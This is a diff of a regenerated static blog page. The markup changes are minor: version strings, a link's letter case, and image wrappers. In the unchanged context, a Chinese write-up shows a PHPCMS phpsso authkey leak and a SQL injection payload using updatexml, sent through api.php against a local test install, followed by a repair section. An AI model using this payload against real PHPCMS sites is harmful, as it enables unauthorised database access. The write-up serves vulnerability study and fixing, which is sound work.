@@ -9,7 +9,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://brick713.github.io/favicon.ico?v=1562035576092">
+<link rel="shortcut icon" href="https://brick713.github.io/favicon.ico?v=1577780469594">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://brick713.github.io/styles/main.css">
 
@@ -45,7 +45,7 @@
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://brick713.github.io">
-        <img src="https://brick713.github.io/images/avatar.png?v=1562035576092" class="site-logo">
+        <img src="https://brick713.github.io/images/avatar.png?v=1577780469594" class="site-logo">
         <h1 class="site-title">Brick713 的小黑屋</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -102,7 +102,7 @@
         
       
         
-          <a class="social-link" href="https://www.zhihu.com/people/Brick713" target="_blank">
+          <a class="social-link" href="https://www.zhihu.com/people/brick713" target="_blank">
             <i class="fab fa-zhihu"></i>
           </a>
         
@@ -144,7 +144,7 @@
         }
 </code></pre>
 <p>此处可以获取cache_admin的信息，内容如下：</p>
-<p><img src="https://i.loli.net/2018/06/27/5b33658cc7db1.png" alt="PHPCMS AUTHKEY.png"></p>
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2018/06/27/5b33658cc7db1.png" alt="PHPCMS AUTHKEY.png" loading="lazy"></figure>
 <p>可以获得authkey和调用它的文件<code>api.php</code></p>
 <p>获得cache的URL是通过上传用户头像处可以解出来：</p>
 <p><code>http://localhost:8038/study/phpcms/phpsso_server/index.php?m=phpsso&amp;c=index&amp;a=uploadavatar&amp;auth_data=v=1&amp;appid=1&amp;data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9%2BDjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQA</code></p>
@@ -154,7 +154,7 @@
 <p><code>http://localhost/api.php?op=phpsso&amp;code=6f56BQgIUVQDVAkGUwEFCgwDAwNSAVBdA1UHD1RSURFZDlgIS0EPCFwDUFhFFl1dCBMWVlkHE0xDUFJDBktfCRhQGlZXVgIFR0weSERPQUpQRh4eHk8CEBA</code></p>
 <p>加密的语句是：<code>action=synlogin&amp;uid=' and updatexml(1,concat('~',user()),1)#</code></p>
 <p>执行完后的结果：</p>
-<p><img src="https://i.loli.net/2018/06/27/5b3365aa949dc.png" alt="结果"></p>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2018/06/27/5b3365aa949dc.png" alt="结果" loading="lazy"></figure>
 <h1 id="修复">修复</h1>
 <ol>
 <li>
